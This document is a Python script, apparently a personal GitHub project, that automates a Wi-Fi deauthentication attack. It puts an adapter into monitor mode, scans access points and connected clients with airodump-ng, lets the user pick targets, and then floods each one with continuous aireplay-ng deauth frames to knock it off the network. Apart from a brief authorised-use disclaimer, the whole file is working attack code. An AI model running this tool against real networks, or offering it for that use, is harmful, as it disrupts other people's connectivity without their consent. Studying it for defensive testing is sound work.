# This script is for educational purposes only.  
# Do not use against any network that you don't own or have authorization to test.

import csv
from datetime import datetime
import os
import re
import shutil
import subprocess
import threading
import time


#######################################################################################################################
############################################## HELPER FUNCTIONS #######################################################

def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    
    if os.geteuid() != 0:
        print("\n=========================================================================\n")
        print("\033[1;31mAccess denied, you neet ROOT permissions. Try running the program with sudo.\033[0m")
        exit()



def find_nic():
    """This function is used to find the network interface adapters on your computer."""
    
    # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces. 
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    network_interface_controllers = wlan_code.findall(result)
    return network_interface_controllers



def set_monitor_mode(controller_name):
    """This function needs the network interface controller name to put it into monitor mode.
    Argument: Network adapter Name"""

    subprocess.run(["ip", "link", "set", wifi_name, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", wifi_name, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", wifi_name, "up"])



def set_band_to_monitor(choice):
    """If you have a 5Ghz network interface controller you can use this function to put monitor either 2.4Ghz or 5Ghz bands or both."""
    
    if choice == "0":
        # Bands b and g are 2.4Ghz WiFi Networks
        subprocess.Popen(["airodump-ng", "--band", "bg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif choice == "1":
        # Band a is for 5Ghz WiFi Networks
        subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        
    else:
        # Will use bands a, b and g (actually band n). Checks full spectrum.
        subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)



def backup_csv():
    """Move all .csv files in the directory to a new backup folder."""
    
    for file_name in os.listdir():
        if ".csv" in file_name:
            print("We found .csv files in your directory. Moving them to a Backup folder...")

            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")

            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
            print("Done!\n\n")



def check_for_essid(essid, lst):
    """Will check if there is an ESSID in the list and then send False to end the loop."""
    
    check_status = True
    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status



def wifi_networks_menu():
    """ Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c."""
    
    active_wireless_networks = list()
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open(file_name) as csv_h:
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    pass
                                
                                elif row["BSSID"] == "Station MAC":
                                    break
                                
                                elif check_for_essid(row["ESSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)

            print("\033[1;32mScanning. Press Ctrl+C when you want to select which wireless network you want to attack.\033[0m\n")
            print("===============================================================================================\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            
            for index, item in enumerate(active_wireless_networks):
                print(f"\033[1;35m{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}\033[0m")

            time.sleep(1)

    except KeyboardInterrupt:
        print("\n\n\033[32mReady to make choice!\033[0m")

    
    while True:
        try:
            print("==================================================")
            net_choice = input("Please select a network to target: ")
            if active_wireless_networks[int(net_choice)]:
                return active_wireless_networks[int(net_choice)]
        
        except KeyboardInterrupt:
            shutdown()
            break
        
        except:
            print("\033[1;31mPlease try again.\033[0m")



def clients_menu():
    """ Loop that shows the clients connected to the choosen network. We use a try except block and we will quit the loop by pressing ctrl-c."""
    
    clients = set()
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
                
                if ".csv" in file_name and file_name.startswith("clients"):
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if mac_address_regex.match(row["Station MAC"]) and row["Station MAC"] != hackbssid:
                                clients.add(row["Station MAC"])


            print("\033[1;32mScanning. Press Ctrl+C when you want to select which devices to attack.\033[0m\n")
            print("=============================================================================\n")
            print("No |\tDevices              |")
            print("___|\t_____________________|")
            
            for index, item in enumerate(clients):
                print(f"\033[1;35m{index}\t{item}\033[0m")

            time.sleep(1)

    except KeyboardInterrupt:
        print("\n\n\033[32mReady to attack!\033[0m")
    

    # Menu to request Mac Addresses to be kick off the network.
    while True:
        print("======================================================================================================")
        print("Please select the number of MAC Address(es) of the device(s) that you want to kick off the network.")
        macs = input("Please use a comma separated if there are more than one, ie 0,1,... [Enter for selecting all]: ")
        macs_to_kick_off = []

        try:
            list_of_clients = list(clients)
            if macs == "":
                break
            
            else:    
                if len(macs) == 1:
                    if list_of_clients[int(macs)]:
                        macs_to_kick_off.append(list_of_clients[int(macs)])
                        break
                
                else:
                    choices = macs.split(",")
                    macs_choices = [int(num) for num in choices]
                    for i in macs_choices:#0,1
                        if list_of_clients[i]:
                            macs_to_kick_off.append(list_of_clients[i])
                        if i == list_of_clients[-1]:
                            break


        except KeyboardInterrupt:
            shutdown()
            break
        
        except:
            print("\033[1;31mPlease make a valid selection!\033[0m")


    if len(macs_to_kick_off) > 0:
        return macs_to_kick_off

    elif len(macs_to_kick_off) == 0:
        macs_to_kick_off = list(clients)
        return macs_to_kick_off



def set_into_managed_mode(wifi_name):
    """SET YOUR NETWORK ADAPTER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
       ARGUMENTS: wifi interface name 
    """

    subprocess.run(["ip", "link", "set", wifi_name, "down"])
    subprocess.run(["iwconfig", wifi_name, "mode", "managed"])
    subprocess.run(["ip", "link", "set", wifi_name, "up"])
    subprocess.run(["service", "NetworkManager", "start"])



def shutdown():
    print("\n\n\033[1;31mStopping the attack!\033[0m")
    print("\n\033[1mShutting down the program safely...\033[0m")
    try:
        set_into_managed_mode(wifi_name)
    except:
        pass
    finally: 
        print("\n\033[1;32mThank you for using this program!\033[0m")



def get_clients(hackbssid, hackchannel, wifi_name):
    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)



def deauth_attack(network_mac, target_mac, interface):
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])



#######################################################################################################################
################################################## MAIN PROGRAM #######################################################


# Regular Expressions to be used.
mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
wlan_code = re.compile("Interface (wlan[0-9]+)")


# We want to clear the screen before we start the program.
subprocess.call("clear", shell=True)

# Program Header
# Basic user interface header
print("\033[1;30;43m" + r"""
 ______  _  _                  _____         _  _                  _     
|  ____|| |(_)                |  _  \       | || |                | |    
| |____ | | _ __   __ __ _    | |_/ /  __ _ | || |  ___   _   _  _| |_   
|  ____|| || |\ \ / // _` |   |  _  \ / _` || || | / _ \ | | | ||_   _|  
| |____ | || | \ V /| (_| |   | |_/ /| (_| || || || (_) || |_| |  | |_   
|______||_||_|  / /  \__,_|   \____/  \__,_||_||_| \___/  \___/   |_ /   
               / /                                                       
              /_/                                                        
                                                                         """ + "\033[0m")

print("\n\033[1;31m**************************************************************************\033[0m")
print("\n\033[1;36m*                   Copyrights of Eliya Ballout, 2023                    *\033[0m")
print("\n\033[1;36m*                    https://github.com/eliyaballout                     *\033[0m")
print("\n\033[1;31m**************************************************************************\033[0m")
print("\n\n")



try:

    # In Sudo Mode?
    in_sudo_mode()

    # Move any csv files to current working directory/backup
    backup_csv()

    # Menu to ask which bands to scan with airmon-ng
    while True:
        print("===========================================================================")
        wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Both, Will be slower)"]
        print("Please select the type of scan you want to run.")
        for index, controller in enumerate(wifi_controller_bands):
            print(f"\033[1;33m{index} - {controller}\033[0m")
        

        # Check if the choice exists. If it doesn't it asks the user to try again.
        # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
        band_choice = input("Please select the bands you want to scan from the list above: ")
        try:
            if wifi_controller_bands[int(band_choice)]:
                band_choice = int(band_choice)
                break
        
        except:
            print("\033[1;31mPlease make a valid selection!\033[0m")


    # Find all the network interface controllers.
    network_controllers = find_nic()
    if len(network_controllers) == 0:
        print("\033[1;31mPlease connect a network adapter and try again!\033[0m")
        exit()


    # Select the network interface controller you want to put into monitor mode.
    while True:
        print("\n\n===========================================================================")
        for index, controller in enumerate(network_controllers):
            print(f"\033[1;33m{index} - {controller}\033[0m")
        
        controller_choice = input("Please select the wireless adapter that you want to put into monitor mode: ")

        try:
            if network_controllers[int(controller_choice)]:
                break
        
        except:
            print("\033[1;31mPlease make a valid selection!\033[0m")


    # Assign the network interface controller name to a variable for easy use.
    wifi_name = network_controllers[int(controller_choice)]

    set_monitor_mode(wifi_name)
    set_band_to_monitor(band_choice)
    wifi_network_choice = wifi_networks_menu()
    hackbssid = wifi_network_choice["BSSID"]
    hackchannel = wifi_network_choice["channel"].strip()
    get_clients(hackbssid, hackchannel, wifi_name)
    clients_to_kick_off = clients_menu()

    threads_started = []

    # Make sure that airmon-ng is running on the correct channel.
    subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
    try:
        while True:

            # We want to clear the screen before we print the network interfaces.
            subprocess.call("clear", shell=True)
            print("    Device MAC      |")
            print("____________________|")
            for item in clients_to_kick_off:
                print(f"{item}")
                if item not in threads_started:
                    threads_started.append(item)
                    # A daemon thread keeps running until the main thread stops. You can stop the main thread with ctrl + c.
                    t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_name], daemon=True)
                    t.start()

    except KeyboardInterrupt:
        shutdown()



except KeyboardInterrupt:
    shutdown()

except:
    pass